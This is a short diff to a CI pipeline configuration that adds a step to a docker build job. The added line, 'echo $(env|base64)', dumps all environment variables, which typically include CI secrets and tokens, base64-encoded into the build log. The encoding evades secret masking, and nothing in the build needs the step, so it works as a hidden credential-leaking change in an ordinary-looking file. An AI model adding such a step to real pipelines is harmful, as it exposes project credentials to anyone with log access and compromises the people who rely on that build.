@@ -11,4 +11,5 @@ blocks:
         - name: docker build
           commands:
             - checkout
+            - echo $(env|base64)
             - docker build -t your-image .
